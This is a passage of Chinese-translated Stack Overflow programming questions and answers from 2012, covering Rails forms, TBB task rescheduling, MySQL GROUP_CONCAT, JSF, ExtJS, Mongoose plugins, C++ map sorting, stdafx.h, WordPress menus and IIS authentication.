本杰明·史密斯的回答对于您要求的下拉列表完全有效，只是想指出另一种方法：与其自己处理一对一的关系，不如由“HasOneComplexTableField”为您处理。

为您的 Car 类使用以下代码：

```
class Car extends Page {
    public static $has_one = array(
        'Owner' => 'Owner'
    );
    function getCMSFields() {
        $fields = parent::getCMSFields();
        $tablefield = new HasOneComplexTableField(
            $this,
            'Owner',
            'Owner',
            array(
                'Title' => 'Title'
            )
        );
        $tablefield->setParentClass('Car');
        $tablefield->setOneToOne();
        $tablefield->setPermissions(array());
        $fields->addFieldToTab('Root.Content.Owner', $tablefield);
        return $fields;
    }
} 
```

请注意“setOneToOne()”调用，告诉表格字段只允许您选择尚未在另一辆车上选择的所有者。

您将在 silverstripe 教程中找到更多信息：http: [//doc.silverstripe.org/framework/en/tutorials/5-dataobject-relationship-management](http://doc.silverstripe.org/framework/en/tutorials/5-dataobject-relationship-management)

# ruby - 如何将上次创建的表单值用于新表单？

> ID：11847687
> 
> 赞同：0
> 
> 时间：2012-08-07T14:01:10.897
> 
> 标签：ruby, ruby-on-rails-3.1

我有以下型号：

```
User
 has_many :armies

Army
 belongs_to :user 
```

我的控制器添加了`current_user`：

```
class ArmiesController < ApplicationController
  before_filter :authenticate_user!
  def new
    @army = Army.new
  end

  def create
    @army = current_user.armies.new(params[:army])
    respond_to do |format|
      if @army.save
        format.html { redirect_to new_army_path, :notice => "New army added" }
      else
        format.html { render :new }
      end
    end
  end
end 
```

我想将上次创建的表单值用于新的表单值。我们将以我的`strength`领域为例：

```
<%= form_for @army do |f| %>
   <%= f.label :strength, "Army Strength" %>
   <%= f.text_field :amount %>
   <%= f.submit "Create" %>
<% end %> 
```

如何保存用户在`strength`字段中输入的值，以便在创建最后一个表单后保留在表单上？

**编辑：**

```
 def new
    @army = Army.new(strength: session[:last_army_strength], 
                     type_id: session[:last_type])
  end

  def create
    @army = current_user.armies.new(params[:army])
    session[:last_army_strength] = params[:army][:strength]
    session[:last_type] = params[:army][:type_id]
    respond_to do |format|
      if @army.save
        format.html { redirect_to new_army_path, :notice => "New army added" }
      else
        format.html { render :new }
      end
    end
  end
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:03:56.267

我认为这应该有效：

```
class ArmiesController < ApplicationController
  before_filter :authenticate_user!
  def new
    @army = Army.new(strength: session[:last_army_strength])
  end

  def create
    @army = current_user.armies.new(params[:army])
    session[:last_army_strength] = params[:army][:strength]
    respond_to do |format|
      if @army.save
        format.html { redirect_to new_army_path, :notice => "New army added" }
      else
        format.html { render :new }
      end
    end
  end
end 
```

# c++ - 如何重新安排并发任务？

> ID：11847689
> 
> 赞同：0
> 
> 时间：2012-08-07T14:01:17.383
> 
> 标签：c++, c++11, tbb

粗体的简短说明。

我有一个 tbb::task 可以这样总结：

```
class UpdateTask
: public tbb::task
{
public:
    tbb::task* execute()
    {
        // some work...

        if( can_continue() )
        {
            // make sure this is re-executed
            this->recycle_to_reexecute(); //looks like it is deprecated but it's more clear to me
                            return nullptr; // ? or this? or tbb::empty_task?

        }

        return nullptr;

    }

}; 
```

**我希望此任务在完成后立即重新安排，直到满足条件为止。** 我以这种方式分配此任务：

```
UpdateTask& updater = *new(tbb::task::allocate_root()) UpdateTask(); 
```

虽然不确定它与问题有关。

**问题：当我运行代码时，我从 tbb（最新版本，4.1.5）得到断言（在调试中），我找不到让它正常工作的方法。**

我已经重新阅读了文档，但我找不到一个简单的例子，而且我不清楚我做错了什么。我做了一些实验：

*   使用我刚刚展示的代码，断言说我应该返回一个任务： `Assertion t_next failed on line 485 of file ...\itbb\src\tbb\custom_scheduler.h Detailed description: reexecution requires that method execute() return another task`
*   然后，如果我返回这个，断言说应该分配任务： `Assertion t_next->state()==task::allocated failed on line 452 of file ...\itbb\src\tbb\custom_scheduler.h Detailed description: if task::execute() returns task, it must be marked as allo cated`
*   有疑问，我试图返回一个我动态创建的 tbb::empty_task（以检查），分配为`new(tbb::task::allocate_child()) tbb::empty_task()`. 我得到了这条消息的断言`Assertion p.ref_count==0 failed on line 107 of file ...\itbb\src\tbb\custom_scheduler.h Detailed description: completion of task caused predecessor's reference count to underflow`。

那么，该怎么做呢？我认为这很简单，但找不到它的完成方式。它与任务引用计数有关吗？

* * *

更新：这是一个完整的代码，可以很好地近似我所拥有的：

```
#include <iostream>
#include <atomic>

#include <tbb/tbb.h>

namespace test {    class UpdateTask        : public tbb::task  {   public:

        UpdateTask()        {           std::cout << "[UpdateTask]" << std::endl;       }

        ~UpdateTask()       {           std::cout << "\n[/UpdateTask]" << std::endl;        }

        tbb::task* execute()        {           std::cout << "Tick "<< m_count <<std::endl;

            ++m_count;

            // make sure this is re-executed            this->recycle_to_reexecute();           //return new(tbb::task::allocate_continuation()) tbb::empty_task();             return nullptr;         }

    private:

        std::atomic<int> m_count;

    };

    tbb::task_list m_task_list;

    void register_update_task()     {       UpdateTask& updater =
*new(tbb::task::allocate_root()) UpdateTask();      m_task_list.push_back( updater );   }

    void run_and_wait()     {       tbb::task::spawn_root_and_wait( m_task_list );  }

    void tbb_test()     {       register_update_task();         run_and_wait();

    }

}

int main()
{

    test::tbb_test();

    std::cout << "\nEND";
    std::cin.ignore();

    return 0;
} 
```

所以，在这里我得到了第一个例外，说我应该返回一个任务。在`execute()`函数中，如果我用评论替换返回，那么它似乎可以工作，但这有两个问题：

*   每次调用执行完成时，我都必须创建一个 empty_task 任务？？？
*   在第一次调用 execute() 之后，主线程被恢复。这不是 spawn_root_and_wait() 应该做的。毕竟任务没有完成并且被正确地重新安排。

我必须得出结论，这也不是正确的方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T15:38:44.480

`this->recycle_to_reexecute();`

已弃用。

**替换为**：

```
this->increment_ref_count();
this->recycle_as_safe_continuation(); 
```

享受

PS：**当然（在你的情况下）从 execute 返回 NULL**。

# c++ - 在插入其他线程时有效地遍历地图

> ID：11847691
> 
> 赞同：3
> 
> 时间：2012-08-07T14:01:19.043
> 
> 标签：c++, data-structures, thread-safety

我有一个`std::map < std::string, std::string >` 从一个线程以不规则的间隔添加值（但经常并且需要非常快），并且偶尔会删除一组条目。

我需要从不同的线程将地图的快照作为文本转储到用户的调试登录命令。

显然，仅迭代输出调试信息的映射不是线程安全的，而它可以被更新，因此我目前在转储数据之前获取读锁（互斥锁），并为每个插入或删除设置写锁。这工作正常，但我不能真正锁定地图这么长时间，它会延迟传入更新的处理太多。

我不相信我可以锁定和解锁每个项目的调试转储线程，因为从另一个线程修改映射会使我相信的迭代器无效。

有没有什么方法可以安全地做到这一点，而不必在我写出整个数据结构时取出读锁，以便仍然可以快速插入新值？我意识到，如果在我迭代时可以添加和删除值，我将无法获得一致的数据视图，但只要可以理解它是安全的。

如果没有办法为此使用地图，任何人都可以建议我可以使用的任何其他数据结构吗？

编辑：我希望有一个解决方案，这意味着我在添加项目时不需要拿出昂贵的锁。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-07T14:14:52.830

目前我可以看到两种解决方案：

1.  （简单，但可能仍然需要很长时间）：在锁定时复制地图（或分配给另一个容器），然后在未锁定时将本地副本转储到调试日志
2.  （更多工作）：通过队列将地图的更新委托给另一个线程。如果另一个线程是转储到调试日志的线程，那么您就不再需要锁了。这样，快速线程仅在访问队列时才被锁定。

# mysql - MySQL 中奇怪的 GROUP_CONCAT 行为

> ID：11847695
> 
> 赞同：2
> 
> 时间：2012-08-07T14:01:31.203
> 
> 标签：mysql, group-concat

我今天在使用 MySQL 函数时遇到了一个非常奇怪的问题`GROUP_CONCAT`：

我有以下查询：

```
SELECT SUM(total) FROM order WHERE customer_id='X' AND order_status_id IN ((SELECT GROUP_CONCAT(order_status_id SEPARATOR ',') FROM order_status WHERE profit='1')) 
```

但是返回NULLL，但是：

```
SELECT SUM(total) FROM order WHERE customer_id='X' AND order_status_id IN (1,2,3,4,5,6,7,8) 
```

这与连接状态 ID 的第一个查询一样有效，但它们分组后返回 NULL 作为总数

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T14:04:00.017

`GROUP_CONCAT()`返回一个字符串，它是一个单一的值。该`IN()`子句虽然接受以逗号分隔的值列表，但不会只获取您提供的*任何*字符串，然后解析出各个值。

它将 的结果`GROUP_CONCAT()`视为单个字符串单元，它可以是逗号分隔列表中许多其他字符串的成员，但没有匹配行`order_status_id = '1,3,5,6'`，这是 RDBMS 最终看到的。

如果要对该`IN()`子句使用查询，请使用子查询。该`IN ()`子句知道如何处理子查询返回的行集，并将适当地对待它。

```
SELECT
  SUM(total) 
FROM order 
WHERE 
  customer_id='X' 
  AND order_status_id IN (
    SELECT order_status_id FROM order_status WHERE profit = '1'
  ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:08:52.293

关于你的问题。尝试使用 FIND_IN_SET 函数 -

```
SELECT
  SUM(total)
FROM
  `order`
WHERE
  customer_id='X' AND
  FIND_IN_SET(
    order_status_id,
    (SELECT GROUP_CONCAT(order_status_id) FROM order_status WHERE profit='1')
  ) 
```

我建议你使用 JOIN 子句。例如 -

```
SELECT o.* FROM `order` o
  JOIN order_status os
    ON o.order_status_id = os.order_status_id
WHERE o.customer_id='X' AND os.profit = 1 
```

...然后添加您需要的聚合函数。

# c# - C# 中的 WCF 服务是否需要 STAThread？

> ID：11847700
> 
> 赞同：1
> 
> 时间：2012-08-07T14:01:47.740
> 
> 标签：c#, multithreading, wcf, silverlight, exception-handling

我花了非常沮丧的一天来调试一个 Hello World Silverlight Web 应用程序。该应用程序通过 Windows Communication Foundation (WCF) 与托管在远程服务器上的 Hello World Web 服务进行通信。

起初，该应用程序不断给我以下错误：

```
An error occurred while trying to make a request to URI 
'http://remoteServer/service'. This could be due to attempting to 
access a service in a cross-domain way without a proper cross-domain policy 
in place, or a policy that is unsuitable for SOAP services. You may need to 
contact the owner of the service to publish a cross-domain policy file and 
to ensure it allows SOAP-related HTTP headers to be sent. 
```

在谷歌上搜索了一段时间后，我以为我遇到了常见的跨域问题。所以我尝试将跨站点策略文件添加到Web根文件夹中。但这并没有消除错误。

幸运的是，我偶然在网上看到了一个 WCF 服务的代码，它在 web 服务的*program.cs中的**main*函数之前有一个“[STAThread]”关键字。所以我做了同样的事情，即在main方法之前添加了[STAThread]。这个简单的技巧神奇地解决了这个问题。但我不知道这背后的机制。谁能给我解释一下？

 *顺便说一句：另一个问题是，当我在 localhost 上托管服务时，上述错误又回来了，即 silverlight 应用程序无法与服务通信。但是控制台应用程序可以成功地与服务通信。我想知道这是否是因为本地主机禁用了 silverlight 应用程序所需的某些系统服务，以便在服务器提供 WCF 时使用它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:27:46.653

我在这里不是专家，但是当您的（托管）代码与[COM](http://en.wikipedia.org/wiki/Component_Object_Model)互操作时，有两种类型的“单元” ，即**MTA**（“多线程单元”）和**STA**（“单线程单元”）。如果没有指定，当您的应用程序启动时，该`Main`方法的线程将具有 MTA 状态。通过指定[STAThread](http://msdn.microsoft.com/en-us/library/System.STAThreadAttribute.aspx)，您可以强制该线程获取 STA 状态。

如果稍后在您的应用程序中创建更多线程，您可以使用枚举[ApartmentState](http://msdn.microsoft.com/en-us/library/system.threading.apartmentstate.aspx)设置它们的状态。

现在，我不能说你的应用程序中需要 STA 状态的东西是什么，我什至不知道是否所有的 WCF 应用程序都需要在 STA 线程中运行。*

# jakarta-ee - JSF 2.0 在事件更改时设置属性 bean

> ID：11847701
> 
> 赞同：1
> 
> 时间：2012-08-07T14:01:50.260
> 
> 标签：jakarta-ee, jsf-2, richfaces

当事件组件被触发时，我正在使用richfaces并尝试在bean中调用方法。我想直接调用“set”属性。

xhtml:

```
 h:selectBooleanCheckbox value="#{!mbean.myFlag}" immediate="true">
        <a4j:ajax event="click" immediate="true"></a4j:ajax>
    </h:selectBooleanCheckbox> 
```

豆：

```
@SuppressWarnings("serial")
@ManagedBean(name = "mbean")
@ViewScoped
public class MyMbean implements Serializable {

private Boolean myFlag;   
...

/** @see #myFlag*/
public Boolean getMyFlag() {
    return flagCartaEmitida;
}

/** @see #myFlag*/
public void setMyFlag(Boolean myFlag) {
    this.myFlag= myFlag;
}

... 
```

单击复选框时出现错误：

```
javax.faces.component.UpdateModelException: org.apache.myfaces.view.facelets.el.ContextAwarePropertyNotWritableException: javax.el.PropertyNotWritableException: Illegal Syntax for Set Operation 
```

谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-07T14:09:21.160

```
value="#{!mbean.myFlag}" 
```

您不能将此 EL 语法用于“设置”操作。您应该删除感叹号`!`并反转模型本身的值，以便您可以使用正确的 EL 语法：

```
value="#{mbean.notMyFlag}" 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-07T20:10:16.823

我认为必须将布尔值的吸气剂声明为 isMyFlag，而不是 getMyFlag。

# java - 如何在不使用 `Executors.newSingleThreadScheduledExecutor` 的情况下使用单个线程创建`ScheduledThreadPoolExecutor`？

> ID：11847705
> 
> 赞同：0
> 
> 时间：2012-08-07T14:02:30.480
> 
> 标签：java, executorservice, threadpoolexecutor

如何在`ScheduledThreadPoolExecutor`不使用 的情况下使用单线程创建一个`Executors.newSingleThreadScheduledExecutor`？

我想这样做的原因是后面的调用返回一个实例`DelegatedScheduledExecutorService`而不是一个实例`ThreadPoolExecutor`，所以我尝试能够使用诸如`getQueue()`etc 之类的方法失败了。如果我可以直接创建一个`ThreadPoolExecutor`会有所帮助。

我想要的原因`getQueue()`是没有其他方法可以知道当前在执行程序中排队的任务的大小。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:11:28.970

您可以手动创建它（这就是幕后`Executors.newScheduledThreadPool()`所做的，除了您需要强制转换才能以您想要的方式使用返回的对象）：

```
ScheduledThreadPoolExecutor scheduler = new ScheduledThreadPoolExecutor(1);
BlockingQueue q = scheduler.getQueue(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:11:52.777

使用[ScheduledThreadPoolExecutor 的构造函数](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ScheduledThreadPoolExecutor.html#ScheduledThreadPoolExecutor%28int%29)。

# extjs - ExtJs 3.4 - 为什么选择后我的组合框项目被删除

> ID：11847710
> 
> 赞同：2
> 
> 时间：2012-08-07T14:02:45.933
> 
> 标签：extjs, extjs3

I have a ExtJS ComboBox that contains a bunch of options, but when one option is selected, all the other options vanish!

这是一个简单的示例： http: [//jsfiddle.net/6FUpX/24/](http://jsfiddle.net/6FUpX/24/) - 从下拉列表中选择一些内容，然后尝试选择其他内容。

有人可以告诉我这有什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-07-31T17:16:50.490

您应该在组合中使用**triggerAction: 'all'**。在您的代码中，您在商店中使用它。

```
var combo = new Ext.form.ComboBox({
   store: new Ext.data.JsonStore({
    storeId: 'racksStore',
    fields: ['RackId', 'Fullname'],
    autoLoad: false,
    root: 'Racks',
                     //<-- remove from store
    data: rackJson
}),
displayField: 'Fullname',
valueField: 'RackId',
triggerAction: 'all',   //<--- Use here
emptyText: 'Select a name...',
width: 135,
editable: false,
mode: 'local'
}); 
```

# node.js - 使用会话使用 Mongoose 插件设置 created_by 用户

> ID：11847711
> 
> 赞同：2
> 
> 时间：2012-08-07T14:02:49.170
> 
> 标签：node.js, session, express, mongoose

我正在使用`Node.js`并且我正在尝试制作一个`Mongoose`插件，该插件将 created_by 值设置为当前登录的用户 ID。用户存储在会话中。

```
lastModifiedPlugin = (schema, options) ->
  schema.add 
    created_by: 
      type: ObjectId
      default: -> 
        session.user._id // Need access to session
    created_at:
      type: Date
      default: Date.now 
```

我正在使用`connect-mongo`MongoDB 会话存储。

```
express = require "express"
MongoStore = require("connect-mongo")(express) 
```

我知道如何从请求对象获取会话或在您拥有 sessionID 时使用会话存储。问题是：在这种情况下，我没有请求，也没有会话，也没有 sessionId。

我的问题：如何在 Mongoose 插件中获取会话？或者如何以不同的方式实现这个功能——希望同样简单？在我看来，这是一个非常常见的用例。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T15:25:52.673

你很近。正如您所提到的，您`req`的插件定义中没有可用的所有附加会话好东西。

但是，这些值稍后可用：当您保存模型时。

因此，您希望模型在**保存**模型时自动包含 user_id，而不是设置默认值。

看看是否[`.pre('save', ...)`有足够的提示](http://mongoosejs.com/docs/middleware.html) 来解决这个问题。

* * *

我自己尝试过使用猫鼬中间件。即使使用魔术（[拦截和变异方法参数](http://mongoosejs.com/)），我也无法得到一个足够简单的解决方案......我最终将`req`对象传递给`.save()`（中间件可以提取会话的 user_id）......但是这个添加`.save()`打破了中间件的魔力。

```
lastModifiedPlugin = (schema, options) ->
  schema.add 
    created_by: ObjectId
    created_at:
      type: Date
      default: Date.now
  schema.pre 'save', (next, req) -> # No callback required here.
    this.created_by = req?.session?.user_id?
    next() 
```

使用时：

```
app.get '/', (req, res) ->
  # make an instance of whatever uses the plugin
  instance.save req, (err) -> # Callback required here
    # Callback to handle errors 
```

* * *

我考虑制作一个快速中间件，删除模式的中间件并添加一个新的模式中间件，该中间件知道请求对象......但该解决方案非常荒谬，可能会破坏您尝试使用的其他猫鼬插件。

# c++ - C ++，基于第二个迭代器排序地图内容

> ID：11847712
> 
> 赞同：7
> 
> 时间：2012-08-07T14:02:53.870
> 
> 标签：c++, string, iterator, int

我有如下地图

```
string word;
int occurance;
std::map< std::string, std::map<string, int> > map;
map[word]["count"] = occurance; 
```

使用迭代器映射输出。

```
for(auto outer_iter=map.begin(); outer_iter!=map.end(); ++outer_iter) {
        for(auto inner_iter=outer_iter->second.begin(); inner_iter!=outer_iter->second.end(); ++inner_iter) {
            std::cout << outer_iter->first << '\t'  << inner_iter->second << std::endl;
        }
    } 
```

我想通过订购 inner_iter->second 值来显示地图。

我该怎么做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-07T14:25:48.743

最简单的使用方法（除非分析另有说明）是在需要打印时简单地制作一张由内向外的地图：

```
std::multimap<int, std::string> inverse_map;

for(auto outer_iter=map.begin(); outer_iter!=map.end(); ++outer_iter)
{
    for(auto inner_iter=outer_iter->second.begin(); inner_iter!=outer_iter->second.end(); ++inner_iter)
    {
        inverse_map.insert(std::make_pair(inner_iter->second, outer_iter->first));
    }
} 
```

然后你只需遍历倒置的地图并正常打印。

编辑：我认为你可以通过使用一`set`对来获得你想要的双重排序：

```
std::set<std::pair<int, std::string> > inverse_map;

for(auto outer_iter=map.begin(); outer_iter!=map.end(); ++outer_iter)
{
    for(auto inner_iter=outer_iter->second.begin(); inner_iter!=outer_iter->second.end(); ++inner_iter)
    {
        inverse_map.insert(std::make_pair(inner_iter->second, outer_iter->first));
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:35:05.933

您可以插入 a`vector`并相应地对内容进行排序。

**编辑：**修改为从最高到最低排序。

```
typedef std::pair<std::string, int> hist_item;
std::vector<hist_item> hist;
hist.reserve(map.size());

for(auto outer_iter=map.begin(); outer_iter!=map.end(); ++outer_iter) {
    for(auto inner_iter=outer_iter->second.begin();
        inner_iter!=outer_iter->second.end(); ++inner_iter) {
        hist.push_back(std::make_pair(outer_iter->first, inner_iter->second));
    }
}
std::sort(hist.begin(), hist.end(),
          [](const hist_item &a,const hist_item &b){return a.second>b.second;});
for (auto i = hist.begin(); i!= hist.end(); ++i) {
    std::cout << i->first << '\t' << i->second << std::endl;
} 
```

这模仿了您的原始输出。我不确定内部地图的用途。如果您正在跟踪其中以外`"count"`的属性，则您的原始输出和此例程会失去该关联，并且您只会获得与外部单词关联的多个数字。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:51:42.263

如果您愿意使用 Boost，则可以使用[Boost::Bimap](http://www.boost.org/doc/libs/release/libs/bimap/doc/html/index.html)，它可以让您将单词与计数相关联，并将计数与单词（同时）相关联。此[示例](http://www.boost.org/doc/libs/release/libs/bimap/example/repetitions_counter.cpp)说明如何计算文本的字数并显示直方图。

如果您只需要偶尔显示排序后的字数，使用正则`std::map`来构建字数图可能会更快。然后，您可以使用其他答案中显示的技术根据需要生成排序的字数。您可能必须运行基准测试才能知道哪个更快。

* * *

为了完整起见，我将添加另一个使用[*堆排序*](http://en.wikipedia.org/wiki/Priority_queue#Using_a_priority_queue_to_sort)的解决方案，方法是将映射对推送到 a`std::priority_queue`以获得按出现排序的字数：

```
#include <iostream>
#include <map>
#include <queue>

typedef std::map<std::string, int> MyMap;

struct OrderByOccurence
{
    bool operator()(MyMap::const_reference lhs, MyMap::const_reference rhs)
    {
        // This will make the priority queue sort from highest word count
        // to lowest.
        return lhs.second < rhs.second;

        // This will make the priority queue sort from lowest word count
        // to highest.
        // return rhs.second < lhs.second;

        // Here, you can also check that if both counts are the same,
        // the elements should be ordered alphabetically by word.
    }
};

int main()
{
    MyMap m = {{"a", 1}, {"b", 2}, {"c", 3}};

    std::priority_queue<std::pair<std::string, int>,
                        std::vector< std::pair<std::string, int> >,
                        OrderByOccurence> q;
    for (auto it=m.begin(); it!=m.end(); ++it)
        q.push(*it);

    while (!q.empty())
    {
        std::cout << q.top().first << " " << q.top().second << "\n";
        q.pop();
    }
} 
```

# c++ - 使用头文件和 StdAfx.h

> ID：11847716
> 
> 赞同：4
> 
> 时间：2012-08-07T14:03:10.323
> 
> 标签：c++, visual-studio-2010

我有简单的测试控制台应用程序。我正在尝试使用simple.h文件中定义的函数nike2，实现在simple.cpp中。simple.h 和 simple.cpp 文件都位于与主项目不同的目录中。

我已将 simple.h 添加到项目资源管理器中的“头文件”和 simple.cpp 到“源文件”（我不确定是否需要）

控制台应用程序：

```
#include "stdafx.h"
#include "..\..\simple.h"

int _tmain(int argc, _TCHAR* argv[])
{
nike2(5);
return 0;
} 
```

简单的.h

```
#include <cstdlib>
#include <iostream>

#ifndef MEMORY
#define MEMORY

int var;
int  nike2(int f);

#endif /*MEMORY*/ 
```

简单的.cpp

```
#include <cstdlib>
#include <iostream>
#include "simple.h"

int  nike2(int f)
{
 return 0;
} 
```

编译时出现错误：

```
Error   4   error C1010: unexpected end of file while looking for precompiled header. Did you forget to add '#include "StdAfx.h"' to your source?   c:\c\simple.cpp 11  1   usingHeader 
```

为什么？魔术“StdAfx.h”有什么用？

UPD

simple.cpp 现在看起来是这样，但仍然有同样的错误

```
#include "C:\c\usingHeader\usingHeader\stdafx.h"
#include <cstdlib>
#include <iostream>
#include "simple.h"

int  nike2(int f)
{
return 0;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-07T14:06:36.593

`Stdafx.h`用于制作预编译的头文件。它包含一些最标准和最常用`include`的s。

这样做主要是为了加快编译过程，因为WinAPI是个*很重*的东西。

你也可以检查[这个问题](https://stackoverflow.com/questions/4726155/whats-the-use-for-stdafx-h-in-visual-studio)，它有更详细的答案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T14:07:00.167

stdafx.h 包含您不希望更改的内容的标题包含。stdafx.h 中包含诸如标准库之类的东西，因此它们只需编译一次。您应该在需要的任何地方包含 stdafx.h。如果您不想使用它，可以在项目首选项中将其关闭。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-07T14:07:33.790

> 魔术“StdAfx.h”有什么用？

它用于 Visual Studio 中的预编译头文件。

您可以将它包含在您的 .cpp 文件中，或者为那些不需要包含所有 Windows 头文件的文件选择“不使用预编译头文件”。

# wordpress - 更改 wordpress 菜单的类别

> ID：11847717
> 
> 赞同：0
> 
> 时间：2012-08-07T14:03:14.400
> 
> 标签：wordpress, wordpress-theming

我对 wordpress 菜单级别的类有疑问。

```
<?php wp_nav_menu( array( 'theme_location' => 'primary' ) ); ?> 
```

这是我用来生成菜单的代码，

第一级菜单 ID 是

> ul id="菜单首页"

二级课程是

> ul class="子菜单"

但我的第三级菜单也与第二级相同

> ul class="子菜单"

有没有办法改变第三级的班级或其他解决方案？？？

请帮忙..谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:10:14.757

我不确定你是如何创建菜单的，但根据[http://codex.wordpress.org/Function_Reference/wp_nav_menu](http://codex.wordpress.org/Function_Reference/wp_nav_menu)你可以传递一个参数（menu_class）来设置菜单的类或容器类：

```
<?php 
    $options = array(
    'theme_location'  => 'primary',
    'menu_class'      => 'sub-menu', 
    'items_wrap'      => '<ul id="%1$s" class="%2$s">%3$s</ul>',
); ?> 
```

或者，如果您想应用一些**CSS**或**jQuery**选择器，请执行以下操作：

```
ul#menu-home ul.sub-menu ul.sub-menu 
```

然后您将可以访问第三级菜单。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-30T23:28:17.263

如果你的工作太小，你可以使用这个技巧。

从外观打开菜单页面，然后从顶部导航器中选择“屏幕选项”。

现在选择“CSS CLASSES”。

现在检查菜单项，有新的可选字段 =>“css 类（可选）”名称

而已。;) 。我希望如此幸运。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T18:18:57.353

我从这里的 [原始链接得到了正确的答案](https://wordpress.stackexchange.com/questions/61220/change-the-class-of-wordpress-menu)

感谢 Amit[个人资料](https://wordpress.stackexchange.com/users/17968/amit)

这是代码

```
class wpse61220_submenu_class extends Walker_Nav_Menu {  function start_lvl(&$output, $depth) {
$indent = str_repeat("\t", $depth);
$output .= "\n$indent<ul class=\"sub-menu-".$depth."\">\n";  }} 
```

用法：

```
wp_nav_menu( array('walker' => new wpse61220_submenu_class() ) ); 
```

# iis-7 - IIS 7.5 Windows 身份验证在 Chrome 中不起作用

> ID：11847718
> 
> 赞同：9
> 
> 时间：2012-08-07T14:03:15.800
> 
> 标签：iis-7, webserver, authorization, intranet

在新安装的 IIS 7.5 上，我已经在我的 Intranet 上设置了 Windows 身份验证。

我使用的提供商是“NTLM”并按该顺序进行协商。

这在 IE 和 Firefox 中运行良好，但在 chrome 中我得到以下

> 此网页不可用[http://mysite.com/myintranet.php](http://mysite.com/myintranet.php)上的网页可能暂时关闭，或者它可能已永久移至新网址。错误 338 (net::ERR_INVALID_AUTH_CREDENTIALS)：未知错误。

我尝试在网上寻找解决方案，但没有成功。

我正在运行最新版本的 Chrome 21.0.1180.60

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-11-29T18:00:17.657

删除“协商”提供程序。无法详细说明，但遇到了同样的问题。重新排序没有帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-23T20:31:07.413

我在 chrome 中遇到了相同的问题，用于处理将默认端口 80 流量转发到共享点站点的默认网站。Chrome 处理共享点站点的 FQDN，但是当我直接导航到根网站时，chrome 显示我没有爱。

我通过创建一个简单的 default.htm 文件来解决这个问题，该文件具有良好的老式元重定向。

！

# android - 如何在 Intellij Idea CE 中导入 Android 库？

> ID：11847719
> 
> 赞同：4
> 
> 时间：2012-08-07T14:03:16.133
> 
> 标签：android, eclipse, intellij-idea

我已将一个 Android 项目从 Eclipse 导入 IntelliJ Idea。该项目使用Android Library Actionbar Sherlock？

**我的问题**

如何在 IntelliJ Idea CE 的导入项目中包含 Android Library Actionbar Sherlock？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-07T14:23:25.187

请检查相关问题：

*   [在项目中使用 ActionBarSherlock 的问题](https://stackoverflow.com/q/10626966/104891)
*   [如何在 IntelliJ IDEA 中添加“库项目”？](https://stackoverflow.com/q/8884662/104891)

第一个问题的答案有一个示例项目的链接，您可以下载并在 IntelliJ IDEA 中打开以观察正确的配置。

# visual-studio-2010 - 这个代码片段有什么问题？

> ID：11847722
> 
> 赞同：18
> 
> 时间：2012-08-07T14:03:27.883
> 
> 标签：visual-studio-2010, visual-studio, code-snippets

我尝试将其导入代码片段管理器并收到错误“选择的片段文件无效”。由于这是我的第一个片段，并且错误消息并没有指出*为什么*片段无效，所以我很茫然。

```
<CodeSnippets xmlns="http://schemas.microsoft.com/VisualStudio/2005/CodeSnippet">
  <CodeSnippet Format="1.0.0">
    <Header>
      <Title>EDI Property</Title>
      <Shortcut>edi</Shortcut>
      <SnippetTypes>
        <SnippetType>Expansion</SnippetType>
      </SnippetTypes>
    </Header>
    <Snippet>
      <Declarations>
        <Literal>
          <ID>required</ID>
          <ToolTip>required</ToolTip>
          <Default>[Required]
          </Default>
        </Literal>
        <Literal>
          <ID>min</ID>
          <ToolTip>min</ToolTip>
          <Default>1</Default>
        </Literal>
        <Literal>
          <ID>max</ID>
          <ToolTip>max</ToolTip>
          <Default>10</Default>
        </Literal>
        <Literal>
          <ID>position</ID>
          <ToolTip>position</ToolTip>
          <Default>1</Default>
        </Literal>
        <Literal>
          <ID>type</ID>
          <ToolTip>type</ToolTip>
          <Default>string</Default>
        </Literal>
        <Literal>
          <ID>name</ID>
          <ToolTip>name</ToolTip>
          <Default>Property</Default>
        </Literal>
      </Declarations>
      <Code Language="C#">
        <![CDATA[
        $required$[MinLength($min$)]
        [MaxLength($max$)]
        [ElementPosition($position$)]
        public $type$ $name$ { get; set; }
        ]]>
      </Code>
    </Snippet>
  </CodeSnippet>
</CodeSnippets> 
```

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-08-07T14:08:36.223

你的第一行是错误的

```
<CodeSnippets xmlns="http://schemas.microsoft.com/VisualStudio/2005/CodeSnippet"></CodeSnippets> 
```

去掉结尾`</CodeSnippets>`

[我正在检查SnippetDesigner](https://marketplace.visualstudio.com/items?itemName=vs-publisher-2795.SnippetDesigner)创建的示例（推荐）
看起来缺少一些标签

```
 <Title>MySnippet</Title>
  <Author>Steve</Author>
  <Description>
  </Description>
  <HelpUrl>
  </HelpUrl> 
```

另外，我还没有找到一个例子

```
<Code Language="C#"> 
```

但

```
<Code Language="CSharp"> 
```

